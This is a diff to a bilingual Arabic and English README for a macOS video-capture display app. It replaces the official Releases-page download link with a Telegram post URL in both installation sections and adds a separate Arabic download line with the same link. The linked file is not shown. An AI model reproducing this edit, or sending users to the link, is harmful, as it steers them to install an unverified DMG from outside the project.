@@ -16,9 +16,13 @@
 ### متطلبات النظام
 - macOS 12.0 أو أحدث
 - جهاز التقاط فيديو متوافق مع macOS
+- 
+  ###التحميل :
+  https://t.me/A7maad_dev/16456
+
 
 ### التثبيت
-1. قم بتحميل أحدث إصدار من [صفحة الإصدارات](../../releases)
+1. قم بتحميل أحدث إصدار من هنا : https://t.me/A7maad_dev/16456
 2. افتح ملف DMG وقم بسحب التطبيق إلى مجلد Applications
 3. افتح التطبيق من مجلد Applications
 
@@ -41,7 +45,7 @@ It can also display the screens of multiple devices, such as the PS5 and Xbox.
 - Video capture device compatible with macOS
 
 ### Installation
-1. Download the latest version from the [Releases page](../../releases)
+1. Download the latest version from here : https://t.me/A7maad_dev/16456
 2. Open the DMG file and drag the app to Applications folder
 3. Open the app from Applications folder
 
